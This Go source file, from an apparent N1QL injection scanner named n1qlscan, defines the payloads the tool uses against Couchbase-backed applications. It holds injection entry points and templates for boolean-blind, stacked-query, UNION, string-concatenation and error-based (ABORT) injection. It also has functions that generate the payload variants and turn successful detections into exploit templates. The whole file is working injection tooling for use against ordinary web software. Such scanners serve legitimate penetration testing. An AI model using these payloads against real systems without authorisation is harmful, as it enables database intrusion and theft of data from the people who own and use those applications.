package payloads

import (
	"fmt"
	"math/rand"
	"strings"

	"github.com/felsec/n1qlscan/internal/target"
)

var EntryPoints = [12]string{
	"'",
	"\"",
	"')",
	"\")",
	"'))",
	"\"))",
	"'--",
	"\"--",
	"')--",
	"\")--",
	"'))--",
	"\"))--",
}

var BoolCheckTemplates = []string{
	"<breakchar><randstr><breakchar>=<breakchar><randstr>",
	"<breakchar><randstr><breakchar>=<breakchar><randstr><breakchar><suffix>",
	"<breakchar><randstr><breakchar>LIKE<breakchar><randstr>",
	"<breakchar><randstr><breakchar>LIKE<breakchar><randstr><breakchar><suffix>",
}

var StackedQueryCheckTemplates = []string{
	"<breakchar>,(select raw<breakchar>N1QLSCAN<breakchar>)",
	"<breakchar>,(select raw<breakchar>N1QLSCAN<breakchar>)<suffix>",
	"<breakchar>,(select raw<breakchar>N1QLSCAN",
	"<breakchar>,(select raw<breakchar>N1QLSCAN<breakchar>",
}

var UnionCheckTemplates = []string{
	"<breakchar>union select'N1QLSCAN",
	"<breakchar>union(select'N1QLSCAN",
	"<breakchar>union select'N1QLSCAN'as nickel28",
	"<breakchar>union select'N1QLSCAN'as nickel28<suffix>",
	"<breakchar>union select'N1QLSCAN'<suffix>",
	"<breakchar>union(select'N1QLSCAN'as nickel28)",
	"<breakchar>union(select'N1QLSCAN'as nickel28)<suffix>",
	"<breakchar>union(select'N1QLSCAN')<suffix>",
	"<breakchar>union select raw'N1QLSCAN",
	"<breakchar>union(select raw'N1QLSCAN",
	"<breakchar>union select raw'N1QLSCAN'as nickel28",
	"<breakchar>union select raw'N1QLSCAN'as nickel28<suffix>",
	"<breakchar>union select raw'N1QLSCAN'<suffix>",
	"<breakchar>union(select raw'N1QLSCAN'as nickel28)",
	"<breakchar>union(select raw'N1QLSCAN'as nickel28)<suffix>",
	"<breakchar>union(select raw'N1QLSCAN')<suffix>",
}

var StringConcatCheckTemplates = []string{
	"<breakchar>||CASE WHEN<breakchar>N1QLSCAN<breakchar>=<breakchar>N1QLSCAN<breakchar> THEN <breakchar><breakchar> ELSE <breakchar><randstr><breakchar> END||<breakchar>",  // success - output matches base
	"<breakchar>||CASE WHEN<breakchar>N1QLSCAN<breakchar>=<breakchar><randstr><breakchar> THEN <breakchar><breakchar> ELSE <breakchar><randstr><breakchar> END||<breakchar>", // failure - error or output not the same as base
	"<breakchar>||<breakchar><breakchar>||<breakchar>",          // success - output matches base
	"<breakchar>||<breakchar><randstr><breakchar>||<breakchar>", // failure - error or output not the same as base
}

var ErrorCheckTemplates = []string{
	"<breakchar>AND ABORT('N1QLSCAN')",
	"<breakchar>AND ABORT('N1QLSCAN')<suffix>",
}

func BuildPayloadSet(entrypoint int, templates []string) []string {
	var payloadSet []string

	entryStr := EntryPoints[entrypoint]
	breakStr := string(entryStr[0])
	entryStr = strings.TrimPrefix(entryStr, breakStr)

	comment := ""
	if strings.HasSuffix(entryStr, "--") {
		comment = "--"
		entryStr = strings.TrimSuffix(entryStr, comment)
	}

	for _, template := range templates {
		suffix := comment
		if len(entryStr) == 0 {
			template = strings.ReplaceAll(template, "<breakchar>", breakStr)
			template = strings.ReplaceAll(template, "<randstr>", RandomStr())
			template = strings.ReplaceAll(template, "<suffix>", suffix)
			if !strings.Contains(template, "|") {
				if !ContainsAll(template, strings.Split(EntryPoints[entrypoint], "")) {
					continue
				}
			}
			payloadSet = append(payloadSet, template)
		} else {
			for idx := range len(entryStr) + 1 {
				template_mod := template
				suffix = strings.Repeat(")", idx) + comment
				template_mod = strings.ReplaceAll(template_mod, "<breakchar>", breakStr)
				template_mod = strings.ReplaceAll(template_mod, "<randstr>", RandomStr())
				template_mod = strings.ReplaceAll(template_mod, "<suffix>", suffix)
				payload := template_mod[:1] + strings.Repeat(")", (len(entryStr)-idx)) + template_mod[1:]
				if !strings.Contains(template, "|") {
					if !ContainsAll(payload, strings.Split(EntryPoints[entrypoint], "")) {
						continue
					}
				}
				payloadSet = append(payloadSet, payload)
			}
		}
	}
	return RemoveDuplicateStr(payloadSet)
}

// BuildBoolPayloadSet
// detection - int - the position in the entrypoints that resulted in identification
// logicOp - bool - Logical operation (AND = true, OR = false)
// condOut - bool - Condition output/result (True or False)
// Returns slice containing payload strings
func BuildBoolPayloadSet(entrypoint int, logicOp bool, condOut bool) []string {
	var payloadSet []string
	var payload string
	entryStr := EntryPoints[entrypoint]
	breakStr := string(entryStr[0])
	entryStr = strings.TrimPrefix(entryStr, breakStr)

	logic := "and"
	if !logicOp {
		logic = "or"
	}

	comment := ""
	if strings.HasSuffix(entryStr, "--") {
		comment = "--"
		entryStr = strings.TrimSuffix(entryStr, comment)
	}

	for _, template := range BoolCheckTemplates {
		suffix := comment
		if len(entryStr) == 0 {
			template = strings.ReplaceAll(template, "<breakchar>", breakStr)
			if condOut {
				template = strings.ReplaceAll(template, "<randstr>", RandomStr())
			} else {
				template = strings.Replace(template, "<randstr>", RandomStr(), 1)
				template = strings.Replace(template, "<randstr>", RandomStr(), 1)
			}
			template = strings.ReplaceAll(template, "<suffix>", suffix)
			payload = breakStr + logic + template
		} else {
			for idx := range len(entryStr) + 1 {
				suffix = strings.Repeat(")", idx) + comment
				template_mod := template
				template_mod = strings.ReplaceAll(template_mod, "<breakchar>", breakStr)
				if condOut {
					template_mod = strings.ReplaceAll(template_mod, "<randstr>", RandomStr())
				} else {
					template_mod = strings.Replace(template_mod, "<randstr>", RandomStr(), 1)
					template_mod = strings.Replace(template_mod, "<randstr>", RandomStr(), 1)
				}
				template_mod = strings.ReplaceAll(template_mod, "<suffix>", suffix)
				payload = breakStr + strings.Repeat(")", (len(entryStr)-idx)) + logic + template_mod
			}
		}
		if !ContainsAll(payload, strings.Split(EntryPoints[entrypoint], "")) {
			continue
		}
		payloadSet = append(payloadSet, payload)
	}
	return RemoveDuplicateStr(payloadSet)
}

func RandomStr() string {
	chars := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, 8)
	for i := range 8 {
		b[i] = chars[rand.Int63()%int64(len(chars))]
	}
	return string(b)
}

func RemoveDuplicateStr(strSlice []string) []string {
	allKeys := make(map[string]bool)
	list := []string{}
	for _, item := range strSlice {
		if _, value := allKeys[item]; !value {
			allKeys[item] = true
			list = append(list, item)
		}
	}
	return list
}

func ContainsAll(s string, wants []string) bool {
	sCount := make(map[string]int)
	fCount := make(map[string]int)

	for _, r := range wants {
		if _, ok := sCount[r]; ok {
			sCount[r] = sCount[r] + 1
		} else {
			sCount[r] = 1
		}
		fCount[r] = 0
	}

	for k := range sCount {
		if !strings.Contains(s, k) {
			return false
		} else {
			fCount[k] = strings.Count(s, k)
		}
	}

	for k, v := range sCount {
		if fCount[k] < v {
			return false
		}
	}
	return true
}

func BuildTemplate(payload string, etype target.ExploitType) string {
	prefix := ""
	part1 := ""
	part2 := ""
	suffix := ""
	switch etype {
	case target.BOOLBLIND:
		if strings.Contains(payload, "or'") {
			prefix = payload[:strings.Index(payload, "or'")+2]
			payload = strings.TrimPrefix(payload, prefix)
			payload = payload[10:]
			if strings.Contains(payload, "LIKE") {
				part1 = "<payload>LIKE"
				payload = payload[4:]
			} else {
				part1 = "<payload>="
				payload = payload[1:]
			}
			part2 = "<check>"
			if len(payload) > 10 {
				suffix = payload[10:]
			}
		}
		if strings.Contains(payload, "and'") {
			prefix = payload[:strings.Index(payload, "and'")+3]
			payload = strings.TrimPrefix(payload, prefix)
			payload = payload[10:]
			if strings.Contains(payload, "LIKE") {
				part1 = "<payload>LIKE"
				payload = payload[4:]
			} else {
				part1 = "<payload>="
				payload = payload[1:]
			}
			part2 = "<check>"
			if len(payload) > 10 {
				suffix = payload[10:]
			}
		}
	case target.UNION:
		prefix = payload[:strings.Index(payload, "union")+6]
		payload = strings.TrimPrefix(payload, prefix)
		part1 = "<payload>"
		if len(payload) > 27 {
			part2 = payload[27:]
		}
	case target.STACK:
		prefix = payload[:strings.Index(payload, ",")+2]
		payload = strings.TrimPrefix(payload, prefix)
		part1 = "<payload>"
		payload = payload[19:]
		if len(payload) < 3 {
			part2 = payload
		} else {
			part2 = payload[:2]
			suffix = payload[2:]
		}
	case target.STRCONCAT:
		prefix = payload[:strings.Index(payload, "||")+2]
		payload = strings.TrimPrefix(payload, prefix)
		part1 = "<payload>"
		part2 = "||"
		suffix = prefix[:1]
	case target.ERROR:
		prefix = payload[:strings.Index(payload, "ABORT")+6]
		payload = strings.TrimPrefix(payload, prefix)
		part1 = "<payload>"
		payload = payload[10:]
		suffix = payload[0:]
	}
	return fmt.Sprintf("%s%s%s%s",
		prefix, part1, part2, suffix)
}
